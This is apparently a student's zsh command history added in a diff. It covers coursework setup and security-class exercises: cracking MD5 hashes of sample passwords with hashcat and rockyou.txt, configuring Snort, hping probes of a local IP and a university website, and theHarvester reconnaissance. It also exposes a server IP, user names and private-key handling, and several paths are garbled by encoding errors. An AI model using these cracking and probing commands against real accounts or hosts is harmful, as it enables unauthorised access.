@@ -1,0 +1,2842 @@
+: 1533787313:0;compaudit | xargs chmod g-w,o-w
+: 1533787359:0;exec zsh
+: 1533787398:0;env
+: 1533787412:0;kill git
+: 1533787509:0;which zsh
+: 1533787520:0;chsh -s /usr/local/bin/zsh
+: 1533787621:0;source ~/.zshrc
+: 1533787775:0;plugins=(git colored-man colorize pip python brew osx zsh-syntax-highlighting compleat)
+: 1533787778:0;source ~/.zshrc
+: 1533788341:0;cd /etc
+: 1533788355:0;ls -a
+: 1533788399:0;nano zshrc
+: 1533788407:0;cd
+: 1533788415:0;ls -a && ping
+: 1533788451:0;nano .zshrc
+: 1533788819:0;exec .zshrc
+: 1533789739:0;chsh -s /usr/local/bin/zsh
+: 1533789757:0;ls -a
+: 1533789767:0;git -h
+: 1533789771:0;git man
+: 1533789778:0;git --help
+: 1533790356:0;zsh_stats
+: 1533790376:0;plugins=(git colored-man colorize pip python brew osx zsh-syntax-highlighting compleat)
+: 1533790393:0;nano .zshrc
+: 1533790431:0;source ~/.zshrc
+: 1533790457:0;nano .zshrc
+: 1533790489:0;source ~/.zshrc
+: 1533790602:0;gst
+: 1533792067:0;verwvewv
+: 1533792498:0;brew install tree
+: 1533792591:0;tree
+: 1533792605:0;cd
+: 1533792612:0;tree -L
+: 1533792623:0;tree -L 1
+: 1533792640:0;brew install ack
+: 1533793265:0;brew cask install pfsense
+: 1533793279:0;brew install pfsense
+: 1533844304:0;brew install hashcat
+: 1533844377:0;hashcta man
+: 1533844381:0;man hashcat
+: 1533844386:0;hashcat
+: 1533844610:0;brew cask install snort
+: 1533845011:0;man hashcat
+: 1533845017:0;hashcat --help
+: 1533845248:0;echo -n "Password1" | md5sum | tr -d " -" >> hash1
+: 1533845297:0;echo -n "Password1" | md5 | tr -d " -" >> hash1
+: 1533845302:0;ls -a
+: 1533845348:0;echo -n "Password2" | md5 | tr -d " -" >> hash1
+: 1533845360:0;echo -n "Password3" | md5 | tr -d " -" >> hash1
+: 1533845365:0;echo -n "Password4" | md5 | tr -d " -" >> hash1
+: 1533845370:0;echo -n "Password5" | md5 | tr -d " -" >> hash1
+: 1533845373:0;hash1
+: 1533845386:0;more hash1
+: 1533846243:0;cd '/Users/baroness/Documents/201802/CS029 Seguridad informaﾌ》ica & Encriptacioﾌ］ (A)/';clear
+: 1534274722:0;brew install seeker
+: 1534274879:0;snort
+: 1534275392:0;snort -v
+: 1534275422:0;snort -vde
+: 1534275740:0;ldconfig
+: 1534275810:0;brew info snort
+: 1534275847:0;brew install pkg-config
+: 1534275878:0;brew info snort
+: 1534275900:0;sudo chmod o+r /dev/bpf*
+: 1534275907:0;brew info snort
+: 1534275943:0;cd /usr/local/Cellar/snort/2.9.11.1
+: 1534275946:0;ls -a
+: 1534275967:0;cd /etc/snort
+: 1534276038:0;sudo -i
+: 1534276074:0;snort
+: 1534276261:0;cd /usr/local/Cellar/snort && ls -a
+: 1534276269:0;cd /usr/local/Cellar/snort/2.9.11.1 && ls -a
+: 1534276284:0;mkdir rules
+: 1534276289:0;ls -a
+: 1534276384:0;cd /usr/local && ls -a
+: 1534276404:0;cd var/log && ls -a
+: 1534276409:0;mkdir snort
+: 1534276425:0;cd /usr/local && ls -a
+: 1534276434:0;cd lib && ls -a
+: 1534276446:0;mkdir snort_dynamicrules
+: 1534276471:0;cd /usr/local/Cellar && ls -a
+: 1534276516:0;sudo chmod -R 5775 /usr/local/Cellar/snort
+: 1534276551:0;cd /usr/local && ls
+: 1534276566:0;cd /var/log/snort
+: 1534276589:0;sudo chmod -R 5775 /usr/local/var/log/snort
+: 1534276605:0;sudo chmod -R 5775 /usr/local/lib/snort_dynamicrules
+: 1534276653:0;sudo chmod -R snort:snort /usr/local/lib/snort_dynamicrules
+: 1534276670:0;sudo chmod -R snort /usr/local/lib/snort_dynamicrules
+: 1534276736:0;sudo touch /usr/local/Cellar/snort/rules/white_list.rules
+: 1534276761:0;cd /usr/local/Cellar/snort/rules && touch white_list.rules
+: 1534276775:0;cd /usr/local/Cellar/snort/rules
+: 1534276781:0;ls -a
+: 1534276787:0;cd /usr/local/Cellar/snort
+: 1534276790:0;ls -a
+: 1534276808:0;cd /usr/local/Cellar/snort/2.9.11.1/rules
+: 1534276822:0;cd /usr/local/Cellar/snort/2.9.11.1/rules && touch white_list.rules
+: 1534276831:0;cd /usr/local/Cellar/snort/2.9.11.1/rules && touch black_list.rules
+: 1534276836:0;cd /usr/local/Cellar/snort/2.9.11.1/rules && touch local.rules
+: 1534276840:0;ls -a
+: 1534277054:0;nano local.rules
+: 1534277273:0;snort
+: 1534277348:0;nano local.rules
+: 1534277701:0;snort -h
+: 1534277726:0;ifconfig
+: 1534277751:0;snort -i lo0
+: 1534438240:0;cd /usr/local/Cellar/snort/
+: 1534438241:0;ls
+: 1534438251:0;cd /usr/local/Cellar/snort/2.9.11.1/ && ls -a
+: 1534440003:0;ifconfig
+: 1534440141:0;nano snort.conf
+: 1534440383:0;snort -V
+: 1534440762:0;snort
+: 1534442060:0;ifconfig
+: 1534442091:0;sudo snort -A console -q -u snort -g snort -i en0
+: 1534442106:0;snort -A console -q -u snort -g snort -i en0
+: 1534442125:0;sudo snort -A console -q -u snort -g snort -i en0
+: 1534442192:0;sudo snort -T -i lo -c /usr/local/Cellar/snort/2.9.11.1/snort.rules
+: 1534442221:0;ls -a
+: 1534442228:0;cd rules
+: 1534442229:0;ls -a
+: 1534442243:0;sudo snort -T -i lo -c /usr/local/Cellar/snort/2.9.11.1/rules/local.rules
+: 1534442362:0;sudo snort -T -i lo -c /usr/local/Cellar/snort/2.9.11.1/snort.conf
+: 1534442371:0;sudo snort -T -i lo -c /usr/local/Cellar/snort/2.9.11.1/rules/local.rules
+: 1534442479:0;sudo snort -T -i lo -c /usr/local/Cellar/snort/2.9.11.1/rules/local.rules -c /usr/local/Cellar/snort/2.9.11.1/snort.conf
+: 1534442524:0;sudo snort -A console -q -u snort -g snort -c /usr/local/Cellar/snort/2.9.11.1/snort.conf -i en0
+: 1534442575:0;sudo snort -A console -q -c /usr/local/Cellar/snort/2.9.11.1/snort.conf -i en0
+: 1534442605:0;cd /var/log/ && ls -a
+: 1534442931:0;nano /usr/local/Cellar/snort/2.9.11.1/snort.conf
+: 1534442988:0;sudo snort -T -i lo -c /usr/local/Cellar/snort/2.9.11.1/rules/local.rules -c /usr/local/Cellar/snort/2.9.11.1/snort.conf
+: 1534443089:0;nano /usr/local/Cellar/snort/2.9.11.1/snort.conf
+: 1534443132:0;sudo snort -T -i lo -c /usr/local/Cellar/snort/2.9.11.1/rules/local.rules -c /usr/local/Cellar/snort/2.9.11.1/snort.conf
+: 1534443141:0;sudo snort -T -i lo -c /usr/local/Cellar/snort/2.9.11.1/rules/local.rules
+: 1534443198:0;cd /var/log/snort
+: 1534443203:0;cd /var/log/
+: 1534443212:0;mkdir snort && cd
+: 1534443226:0;sudo mkdir snort && cd
+: 1534443241:0;sudo snort -T -i lo -c /usr/local/Cellar/snort/2.9.11.1/rules/local.rules
+: 1534443303:0;sudo snort -A console -q -c /usr/local/Cellar/snort/2.9.11.1/snort.conf -i en0
+: 1534443330:0;cd /var/log/snort 
+: 1534443333:0;nano snort.log.1534443303
+: 1534443338:0;ls -a
+: 1534443341:0;nano snort.log.1534443303
+: 1534443358:0;sudo nano snort.log.1534443303
+: 1534443370:0;sudo snort -A console -q -c /usr/local/Cellar/snort/2.9.11.1/snort.conf -i en0
+: 1534443390:0;sudo -i
+: 1534525437:0;brew install java
+: 1534525523:0;brew install rjava
+: 1534525650:0;brew cask install java
+: 1534526781:0;system("defaults write org.R-project.R force.LANG en_US.UTF-8")
+: 1534526802:0;system('defaults write org.R-project.R force.LANG en_US.UTF-8')
+: 1534526838:0;exec bash
+: 1534528833:0;ver java
+: 1534528836:0;java -ver
+: 1534528841:0;brew info java
+: 1534528856:0;java -h
+: 1534528870:0;java info
+: 1534528875:0;info java
+: 1534528892:0;ver java
+: 1534528900:0;jdk -h
+: 1534529535:0;java -v
+: 1534529546:0;brew uninstall java
+: 1534529566:0;brew cask uninstall java
+: 1534543698:0;brew cask install docker
+: 1534544724:0;docker
+: 1534544757:0;sudo docker
+: 1534544794:0;docker pull rb2nem/nis
+: 1534544933:0;docker run -p 7890:7890 rb2nem/nis:latest
+: 1534545038:0;docker container -ls
+: 1534545057:0;docker ps -a
+: 1534545071:0;docker -ls
+: 1534545075:0;docker -h
+: 1534545093:0;docker inspect ps -a
+: 1534545097:0;docker ps -a
+: 1534545104:0;docker inspect fd1acefdb9e9
+: 1534545151:0;docker system df
+: 1534810336:0;docker run -p 7890:7890 rb2nem/nis:latest
+: 1534810369:0;docker system df
+: 1534811040:0;man ssh-keygen
+: 1534811274:0;ssh-keygen -t rsa
+: 1534811726:0;cat melchior.pub
+: 1534811740:0;nano melchior.pub
+: 1534812359:0;ssh melchior@159.65.139.210
+: 1534812451:0;ssh-copy-id melchior@159.65.139.210
+: 1534812468:0;brew install ssh-copy-id
+: 1534812652:0;man ssh-copy-id
+: 1534812673:0;ssh-copy-id melchior@159.65.139.210
+: 1534812705:0;man ssh-copy-id
+: 1534812796:0;ssh-copy-id -i /Users/baroness/.ssh/melchior.pub melchior@159.65.139.210
+: 1534812809:0;cd /Users/baroness/.ssh/ && ls
+: 1534812814:0;cd /Users/baroness/.ssh/ && ls -a
+: 1534813661:0;ssh-copy-id -i /Users/baroness/.ssh/magisys/melchior.pub melchior@159.65.139.210
+: 1534814471:0;sudo ssh-copy-id -i /Users/baroness/.ssh/magisys/melchior.pub melchior@159.65.139.210
+: 1534814577:0;cat ~/.ssh/melchior.pub | ssh melchior@159.65.139.210 "mkdir -p ~/.ssh && chmod 700 ~/.ssh && cat >>  ~/.ssh/authorized_keys"
+: 1534814596:0;cat ~/.ssh/magisys/melchior.pub | ssh melchior@159.65.139.210 "mkdir -p ~/.ssh && chmod 700 ~/.ssh && cat >>  ~/.ssh/authorized_keys"
+: 1534814607:0;ls -a
+: 1534814612:0;nano config
+: 1534814757:0;cat ~/.ssh/magisys/melchior.pub | ssh melchior@159.65.139.210 "mkdir -p ~/.ssh && chmod 700 ~/.ssh && cat >>  ~/.ssh/authorized_keys"
+: 1534814765:0;sudo ssh-copy-id -i /Users/baroness/.ssh/magisys/melchior.pub melchior@159.65.139.210
+: 1534814787:0;ssh melchior@159.65.139.210
+: 1534814903:0;cat magisys/melchior
+: 1534817090:0;ssh root@159.65.139.210
+: 1534818362:0;cat ~/.ssh/magisys/melchior | ssh melchior@159.65.139.210 "mkdir -p ~/.ssh && chmod 700 ~/.ssh && cat >>  ~/.ssh/authorized_keys"
+: 1534818470:0;ssh root@159.65.139.210
+: 1534819344:0;ssh-copy-id -i /Users/baroness/.ssh/magisys/melchior.pub melchior@159.65.139.210
+: 1534819809:0;cat ~/.ssh/magisys/melchior.pub | ssh melchior@159.65.139.210 "mkdir -p ~/.ssh && touch ~/.ssh/authorized_keys && chmod -R go= ~/.ssh && cat >> ~/.ssh/authorized_keys"
+: 1534820570:0;ssh-copy-id -i /Users/baroness/.ssh/magisys/melchior.pub melchior@159.65.139.210
+: 1534820859:0;cat ~/.ssh/magisys/melchior
+: 1534820866:0;cat ~/.ssh/magisys/melchior.pub
+: 1534820882:0;ssh root@159.65.139.210
+: 1534821058:0;ls -a
+: 1534821074:0;cd .ssh/magisys
+: 1534821105:0;ssh-keygen -t rsa
+: 1534821128:0;ls -a
+: 1534821164:0;ssh-keygen -t rsa
+: 1534821278:0;cat melchior.pub
+: 1534821283:0;cat balthasar.pub
+: 1534821385:0;ssh melchior@159.65.139.210
+: 1534821401:0;ssh balthasar@159.65.139.210
+: 1534821433:0;nano .ssh/config
+: 1534821474:0;ssh balthasar@159.65.139.210
+: 1534821529:0;cat balthasar
+: 1534821540:0;cat .ssh/magisys/balthasar
+: 1534824291:0;cat melchior
+: 1534824336:0;root
+: 1534824339:0;cat root
+: 1534824362:0;cat root.pub
+: 1534824826:0;ssh melchior@159.65.139.210
+: 1534825180:0;brew install mosh
+: 1534825334:0;mosh melchior@159.65.139.210
+: 1534825471:0;mosh -p 60001 melchior@159.65.139.210
+: 1534831958:0;docker system df
+: 1534873956:0;ssh melchior@159.65.139.210
+: 1534875376:0;echo -n "cowboy123" | md5 | tr -d " -" >> /Users/baroness/Documents/201802/CS029 Seguridad informaﾌ》ica & Encriptacioﾌ］ (A)/Tarea03 Hashcat/hackmefriends
+: 1534875495:0;cd /Users/baroness/Documents/201802/CS029 Seguridad informa<0301>tica & Encriptacio<0301>n (A)/Tarea03 Hashcat/hackmefriends
+: 1534875501:0;cd /Users/baroness/Documents/201802/CS029 Seguridad informa<0301>tica & Encriptacio<0301>n (A)/Tarea03 Hashcat/
+: 1534875517:0;cd "/Users/baroness/Documents/201802/CS029 Seguridad informa<0301>tica & Encriptacio<0301>n (A)/Tarea03 Hashcat/"
+: 1534875532:0;cd "/Users/baroness/Documents/201802/CS029 Seguridad informa<0301>tica & Encriptacioﾃｳn (A)/Tarea03 Hashcat/"
+: 1534875537:0;cd "/Users/baroness/Documents/201802/CS029 Seguridad informa<0301>tica & Encriptaciﾃｳn (A)/Tarea03 Hashcat/"
+: 1534875580:0;cd /Users/baroness/Documents/201802/
+: 1534875591:0;cd CS029\ Seguridad\ informﾃメtica\ \&\ Encriptaciﾃｳn\ \(A\)
+: 1534875596:0;cd Tarea03\ Hashcat
+: 1534875620:0;echo -n "cowboy123" | md5 | tr -d " -" >> hackmefriends
+: 1534875624:0;ls
+: 1534875648:0;echo -n "bluevalentine" | md5 | tr -d " -" >> hackmefriends
+: 1534875686:0;echo -n 窶�ｼloverboy窶�ｽ | md5 | tr -d " -" >> hackmefriends
+: 1534875696:0;echo -n 窶�ｼleftovers窶�ｽ | md5 | tr -d " -" >> hackmefriends
+: 1534875706:0;echo -n 窶�ｼphantom delia窶�ｽ | md5 | tr -d " -" >> hackmefriends\
+
+: 1534876638:0;hashcat 窶Φm 0 hackmyfriends.txt rockyou.txt
+: 1534876673:0;md5
+: 1534876685:0;hashcat 窶Φm 0 hackmyfriends.txt rockyou.txt
+: 1534876697:0;hashcat 窶Φm 0 hackmyfriends rockyou.txt
+: 1534876722:0;hashcat 窶Φm md5 hackmyfriends.txt rockyou.txt
+: 1534876731:0;hashcat hackmyfriends.txt rockyou.txt
+: 1534876759:0;hascat man
+: 1534876763:0;man hashcat
+: 1534876769:0;hashcat --help
+: 1534876983:0;hashcat -a 0 -m 0 hackmyfriends rockyou.txt
+: 1534877047:0;hashcat --benchmark
+: 1534877170:0;brew install gmp
+: 1534877201:0;brew install OpenCL-Headers
+: 1534877520:0;brew install opencl
+: 1534877570:0;include <OpenCL/cl.h>
+: 1534877857:0;ls /System/Library/Frameworks/OpenCL.framework\
+
+: 1534878466:0;ssh melchior@159.65.139.210
+: 1534881086:0;mosh -p 60001 melchior@159.65.139.210
+: 1534882100:0;mkdir tallerpki.ssl && cd tallerpki.ssl
+: 1534882195:0;openssl genrsa -out talleroki.key 2048
+: 1534882217:0;cat talleroki.key
+: 1534882337:0;openssl -req -new -sha256 -key talleroki.key -out talleroki.csr
+: 1534882355:0;openssl req -new -sha256 -key talleroki.key -out talleroki.csr
+: 1534882503:0;ls
+: 1534882553:0;car talleroki.csr
+: 1534882560:0;cat talleroki.csr
+: 1534956744:0;ssh melchior@159.65.139.210
+: 1535044187:0;ls
+: 1535044193:0;cd
+: 1535044194:0;ls
+: 1535044196:0;ls /System/Library/Frameworks/OpenCL.framework
+: 1535046690:0;sudo cp cl.hpp /System/Library/Frameworks/OpenCL.framework/Headers
+: 1535046758:0;sudo cp cl2.hpp /System/Library/Frameworks/OpenCL.framework/Headers
+: 1535046799:0;g++ main.cpp -framework OpenCL
+: 1535047055:0;cd /Users/baroness/Documents/201802/CS029 Seguridad informaﾌ》ica & Encriptacioﾌ］ (A)/Tarea03 Hashcat
+: 1535047060:0;cd "/Users/baroness/Documents/201802/CS029 Seguridad informaﾌ》ica & Encriptacioﾌ］ (A)/Tarea03 Hashcat"
+: 1535047101:0;hascat -m 0 hackmyfriends rockyou.txt
+: 1535047108:0;hashcat -m 0 hackmyfriends rockyou.txt
+: 1535047163:0;hashcat -m 0 hackmyfriends rockyou.txt -O
+: 1535052019:0;brew uninstall hashcat
+: 1535052086:0;git clone https://github.com/hashcat/hashcat.git
+: 1535052106:0;mkdir -p hashcat/deps
+: 1535052115:0;ls
+: 1535052214:0;rm -r hashcat
+: 1535052225:0;sudo rm -r hashcat
+: 1535052242:0;brew install hashcat
+: 1535052315:0;hashcat -m 0 hackmyfriends rockyou.txt -O
+: 1535052442:0;ssh melchior@159.65.139.210
+: 1535075524:0;brew install git-flow-avh
+: 1535075627:0;git flow init
+: 1535075815:0;cd /Users/baroness/Documents/201802/CS044 Blockchain (A)
+: 1535075821:0;cd "/Users/baroness/Documents/201802/CS044 Blockchain (A)"
+: 1535075824:0;git init
+: 1535075832:0;git clone https://github.com/cryptoufm/NemWallet.git
+: 1535075837:0;ls
+: 1535075877:0;cd NemWallet
+: 1535075890:0;git flow init 
+: 1535075934:0;git branch
+: 1535076357:0;ls
+: 1535076363:0;cd nemWallet
+: 1535076365:0;ls
+: 1535076378:0;ls -a
+: 1535076624:0;brew install node
+: 1535077094:0;node -v
+: 1535077109:0;npm -v
+: 1535077127:0;npm install
+: 1535077321:0;npm start
+: 1535077401:0;npm install watchman --save
+: 1535077552:0;npm start
+: 1535077640:0;npm ls react-native-scripts
+: 1535077695:0;sudo sysctl -w kern.maxfiles=5242880
+: 1535077832:0;sudo sysctl -w kern.maxfilesperproc=524288
+: 1535077837:0;npm ls react-native-scripts
+: 1535077846:0;npm start
+: 1535119896:0;brew cask install yoink
+: 1535333440:0;open $TMPDIR
+: 1535385696:0;ssh melchior@159.65.139.210
+: 1535480073:0;brew cask uninstall snort
+: 1535480085:0;brew uninstall snort
+: 1535480109:0;ssh melchior@159.65.139.210
+: 1535485267:0;ifconfig
+: 1535485287:0;ping localhost
+: 1535485342:0;ping 10.174.238.224
+: 1535485363:0;hping3 -s 10.174.238.224
+: 1535485370:0;brew install hping3
+: 1535485523:0;brew install hping
+: 1535485558:0;hping3 -s 10.174.238.224
+: 1535485575:0;hping -s 10.174.238.224 -p 22
+: 1535485579:0;hping
+: 1535485585:0;hping-3
+: 1535485597:0;hping--3
+: 1535485611:0;hping -h
+: 1535485617:0;hping3 -h
+: 1535485629:0;hping-3 -h
+: 1535551861:0;ls
+: 1535551949:0;cd /Users/baroness/Documents/201802/CS044 Blockchain (A)/NemWallet
+: 1535551955:0;cd "/Users/baroness/Documents/201802/CS044 Blockchain (A)/NemWallet"
+: 1535551960:0;git pull
+: 1535551982:0;git pull origin develop
+: 1535551991:0;git commit
+: 1535552002:0;git stash
+: 1535552006:0;git pull
+: 1535552012:0;git -h
+: 1535552020:0;git push
+: 1535552187:0;git stash list
+: 1535552254:0;git stash
+: 1535552259:0;git stash pull
+: 1535552264:0;git stash push
+: 1535552282:0;git stash apply
+: 1535552289:0;git stash push
+: 1535552297:0;git push
+: 1535552304:0;git stash pop
+: 1535552319:0;git merge
+: 1535552398:0;git pull
+: 1535552402:0;git stash
+: 1535552409:0;git pull
+: 1535552414:0;git unmerge
+: 1535552451:0;git add
+: 1535552455:0;git add .
+: 1535552458:0;git push
+: 1535552463:0;git pull
+: 1535552475:0;npm run start
+: 1535552521:0;npm install watchman --save
+: 1535552536:0;npm install -g npm --save
+: 1535552579:0;npm ls react-native-scripts
+: 1535552592:0;npm run start
+: 1535552742:0;npm install
+: 1535552837:0;npm init --yes
+: 1535552844:0;npm run start
+: 1535552856:0;npm run
+: 1535552865:0;npm start
+: 1535552872:0;npm run build
+: 1535553096:0;npm start
+: 1535553122:0;ls
+: 1535553130:0;nano package.json
+: 1535553200:0;npm install npm@latest -g
+: 1535554701:0;npm start
+: 1535554747:0;npm install
+: 1535554753:0;npm start
+: 1535554771:0;nano package.json
+: 1535555163:0;npm init --yes
+: 1535555168:0;npm init
+: 1535555210:0;npm start
+: 1535555225:0;git stash
+: 1535555231:0;git stash drop
+: 1535555237:0;git pull
+: 1535555241:0;ls
+: 1535555254:0;cd nemWallet && ls
+: 1535555281:0;npm init
+: 1535555294:0;npm run start
+: 1535555322:0;npm install -g npm --save
+: 1535555346:0;npm install watchman --save
+: 1535555400:0;npm install react-native-scripts --save
+: 1535555507:0;npm audit fix
+: 1535555611:0;npm start
+: 1535555625:0;react-native-scripts start
+: 1535555637:0;npm install react-native-scripts --save
+: 1535555676:0;react-native-scripts start
+: 1535555689:0;npm audit fix --force
+: 1535555788:0;react-native-scripts start
+: 1535555799:0;react-native start
+: 1535555804:0;npm start
+: 1535555909:0;npm cache clean --force
+: 1535555918:0;delete node_modules
+: 1535555923:0;npm delete node_modules
+: 1535555947:0;ls
+: 1535555956:0;rm -r node_modules
+: 1535562120:0;npm install
+: 1535562450:0;npm start
+: 1535562480:0;sudo sysctl -w kern.maxfiles=5242880
+: 1535562491:0;sudo sysctl -w kern.maxfilesperproc=524288
+: 1535562514:0;npm start
+: 1535570787:0;cd ..
+: 1535570799:0;rm -r NemWallet
+: 1535570855:0;y
+: 1535570859:0;ls
+: 1535570867:0;rm -r NemWallet
+: 1535570870:0;y
+: 1535570873:0;rm -r NemWallet
+: 1535570893:0;git clone https://github.com/cryptoufm/NemWallet.git
+: 1535570911:0;git branch
+: 1535570926:0;cd NemWallet
+: 1535570942:0;git branch
+: 1535570956:0;git pull origin develop
+: 1535570962:0;ls
+: 1535570968:0;cd nemWallet
+: 1535570977:0;npm install
+: 1535571048:0;npm audit fix
+: 1535571127:0;npm start
+: 1535571232:0;npm install native-base
+: 1535571242:0;npm install native-base --save
+: 1535571273:0;npm install react --save
+: 1535571297:0;npm install react-native --save
+: 1535571327:0;npm install ngrok --save
+: 1535571368:0;npm install expo --save
+: 1535571398:0;npm install freebsd --save
+: 1535571443:0;npm install react-dom --save
+: 1535571490:0;npm install react-native-web --save
+: 1535571546:0;npm audit fix
+: 1535571566:0;npm start
+: 1535571658:0;npm install watchman --save
+: 1535571675:0;npm start
+: 1535571736:0;npm audit
+: 1535571754:0;npm install expo@29.0.0
+: 1535571783:0;npm install expo@29.0.0 --save
+: 1535571806:0;npm start
+: 1535571854:0;npm run
+: 1535571876:0;npm react-native-scripts start
+: 1535571879:0;react-native-scripts start
+: 1535571925:0;npm install semver-major --save
+: 1535571960:0;cd ..
+: 1535571963:0;git pull
+: 1535571978:0;brew uninstall npm
+: 1535571985:0;brew uninstall node
+: 1535571995:0;brew uninstall nodejs
+: 1535572007:0;cd /usr/local/Cellar && ls
+: 1535572049:0;brew install nodejs
+: 1535572086:0;cd [~/Documents/201802/CS044 Blockchain (A)/NemWallet
+: 1535572101:0;cd "~/Documents/201802/CS044 Blockchain (A)/NemWallet"
+: 1535572109:0;cd "/Documents/201802/CS044 Blockchain (A)/NemWallet"
+: 1535572132:0;cd "/Users/baroness/Documents/201802/CS044 Blockchain (A)/NemWallet"
+: 1535572149:0;cd nemWallet
+: 1535572153:0;npm start
+: 1535572288:0;ssh melchior@159.65.139.210
+: 1535572918:0;brew uninstall npm
+: 1535572924:0;brew uninstall nodejs
+: 1535573087:0;cd /usr/local/Cellar/ && ls
+: 1535573236:0;brew uninstall ack
+: 1535573292:0;brew uninstall gdbm
+: 1535586306:0;ls
+: 1535586358:0;cd "/Users/baroness/Documents/201802/CS044 Blockchain (A)/NemWallet"
+: 1535586367:0;cd nemWallet
+: 1535586443:0;nodejs -V
+: 1535586447:0;npm -v
+: 1535586472:0;cd ..
+: 1535586491:0;rm -r NemWallet --force
+: 1535586636:0;y
+: 1535586643:0;rm -r NemWallet
+: 1535586651:0;ls
+: 1535586660:0;git init
+: 1535588453:0;brew install expo
+: 1535589102:0;git clone https://github.com/cryptoufm/NemWallet.git
+: 1535589109:0;rm -r NemWallet
+: 1535589147:0;git clone https://github.com/cryptoufm/NemWallet.git
+: 1535589155:0;cd NemWallet
+: 1535589158:0;git pull
+: 1535589166:0;git pull origin develop
+: 1535589174:0;git branch
+: 1535589251:0;git flow init
+: 1535589327:0;git branch
+: 1535589334:0;git pull
+: 1535589342:0;npm start
+: 1535589347:0;npm install
+: 1535589359:0;cd nemWallet
+: 1535589362:0;npm start
+: 1535589367:0;npm install
+: 1535589448:0;npm start
+: 1535596523:0;atom .
+: 1535652277:0;ls
+: 1535652289:0;cd tallerpki.ssl && ls
+: 1535652443:0;cd ..
+: 1535652454:0;cp tallerpki.ssl "/Users/baroness/Documents/201802/CS029 Seguridad informaﾌ》ica & Encriptacioﾌ］ (A)/PKI (public key infrastructure)"
+: 1535652500:0;cp -R tallerpki.ssl "/Users/baroness/Documents/201802/CS029 Seguridad informaﾌ》ica & Encriptacioﾌ］ (A)/PKI (public key infrastructure)"
+: 1535652518:0;cd "/Users/baroness/Documents/201802/CS029 Seguridad informaﾌ》ica & Encriptacioﾌ］ (A)/PKI (public key infrastructure)"
+: 1535652521:0;ls
+: 1535652555:0;brew install go
+: 1535652636:0;go -v
+: 1535652655:0;go -V
+: 1535652658:0;version go
+: 1535652660:0;go info
+: 1535652663:0;info go
+: 1535652672:0;brew info go
+: 1535652693:0;brew uninstall go
+: 1535652699:0;brew info go
+: 1535652716:0;go -v
+: 1535653035:0;brew install go
+: 1535653160:0;export PATH=$PATH:/usr/local/opt/go/libexec/bin
+: 1535653302:0;export PATH=$PATH:/usr/local/go/bin
+: 1535653333:0;go get -u github.com/cloudflare/cfssl/cmd/cfssl
+: 1535653410:0;cd $GOPATH/bin/cfssl
+: 1535653420:0;go get -u github.com/cloudflare/cfssl/cmd/cfssljson
+: 1535653482:0;cfssl
+: 1535653489:0;cfssl sign
+: 1535653508:0;cfssl
+: 1535653528:0;go env
+: 1535653572:0;cat $GOPATH
+: 1535653598:0;ls
+: 1535653604:0;cd go
+: 1535653605:0;ls
+: 1535653627:0;brew info go
+: 1535653636:0;export PATH=$PATH:/usr/local/opt/go/libexec/bin
+: 1535653791:0;export GOPATH=$HOME
+: 1535653838:0;$PATH
+: 1535653876:0;export GOPATH=$HOME/go
+: 1535653891:0;export GOROOT=/usr/local/opt/go/libexec
+: 1535653897:0;export PATH=$PATH:$GOPATH/bin
+: 1535653903:0;export PATH=$PATH:$GOROOT/bin
+: 1535653938:0;$PATH
+: 1535653942:0;$GOPATH
+: 1535653959:0;cfssl
+: 1535653979:0;cfssl -h
+: 1535654033:0;cd /Users/baroness/Documents/201802/CS029 Seguridad informaﾌ》ica & Encriptacioﾌ］ (A)/PKI (public key infrastructure)
+: 1535654037:0;cd "/Users/baroness/Documents/201802/CS029 Seguridad informaﾌ》ica & Encriptacioﾌ］ (A)/PKI (public key infrastructure)"
+: 1535654047:0;nano csr_ca.json
+: 1535654395:0;cfssl gencert -initca csr_ca.json | cfssljson -bare ca
+: 1535654412:0;ls
+: 1535654617:0;cd /etc/cfssl/
+: 1535654751:0;cd /etc
+: 1535654755:0;ls
+: 1535654794:0;cd
+: 1535654795:0;go get -u github.com/kisom/goutils/cmd/certdump
+: 1535654808:0;go get -u github.com/cloudflare/cfssl/cmd/...
+: 1535654820:0;go get -u github.com/cloudflare/cfssl_trust/...
+: 1535654959:0;./release.sh
+: 1535654970:0;cfssl-trust -d ./cert.db -b int expiring
+: 1535654984:0;brew install cfssl-trust
+: 1535655190:0;cfssl serve
+: 1535655985:0;cfssl serve -ca-key ca-key.pem -ca ca.pem -config config_ca.json
+: 1535656008:0;nano config_ca.json
+: 1535656028:0;cfssl serve -ca-key ca-key.pem -ca ca.pem -config config_ca.json
+: 1535656349:0;ls
+: 1535656360:0;cat ca.csr
+: 1535658563:0;hping www.ufm.edu
+: 1535658570:0;hping3 -h
+: 1535658575:0;hping -h
+: 1535658581:0;brew install hping
+: 1535658600:0;ssh melchior@159.65.139.210
+: 1535660409:0;pip install requests
+: 1535660480:0;cd "/Users/baroness/Documents/201802/CS029 Seguridad informaﾌ》ica & Encriptacioﾌ］ (A)"
+: 1535660498:0;git clone https://github.com/laramies/theHarvester.git
+: 1535660573:0;ls
+: 1535660579:0;cd theHarvester
+: 1535660580:0;ls
+: 1535660595:0;dig
+: 1535865706:0;cd /Users/baroness/Documents/201802/CS-DS001 Data Wrangling (A)
+: 1535865709:0;cd "/Users/baroness/Documents/201802/CS-DS001 Data Wrangling (A)"
+: 1535865717:0;git clone https://github.com/armi3/data-wrangling-templates.git
+: 1535865778:0;git add .
+: 1535865826:0;git push
+: 1535865860:0;cd data-wrangling-templates
+: 1535865864:0;git add .
+: 1535865874:0;git push
+: 1535865882:0;git commit
+: 1535865937:0;git commit -m "Adding two case studies and a lessons area."
+: 1535865943:0;git push
+: 1535867204:0;git config --global http.postBuffer 157286400
+: 1535867823:0;git push
+: 1535868082:0;git add .
+: 1535868094:0;git commit -m "Adding two case studies and a lessons area."
+: 1535868101:0;git push
+: 1535868528:0;git add .
+: 1535868533:0;git commit -m "Adding two case studies and a lessons area."
+: 1535868535:0;git push
+: 1535868603:0;cd data-wrangling-templates
+: 1535868611:0;cd "/Users/baroness/Documents/201802/CS-DS001 Data Wrangling (A)"
+: 1535868615:0;cd data-wrangling-templates
+: 1535868623:0;git init
+: 1535868631:0;git push
+: 1535868734:0;git push --set-upstream origin
+: 1535868857:0;git push --set-upstream origin master
+: 1535868871:0;git info
+: 1535868881:0;git --help
+: 1535911607:0;git init
+: 1535911611:0;git add .
+: 1535911633:0;git commit -m "Lessons path."
+: 1535911638:0;git push
+: 1535911690:0;git branch
+: 1535911720:0;cd ..
+: 1535911729:0;rm -r data-wrangling-templates
+: 1535911754:0;y
+: 1535911757:0;rm -r data-wrangling-templates
+: 1535911783:0;git init
+: 1535911788:0;git clone https://github.com/armi3/data-wrangling-templates.git
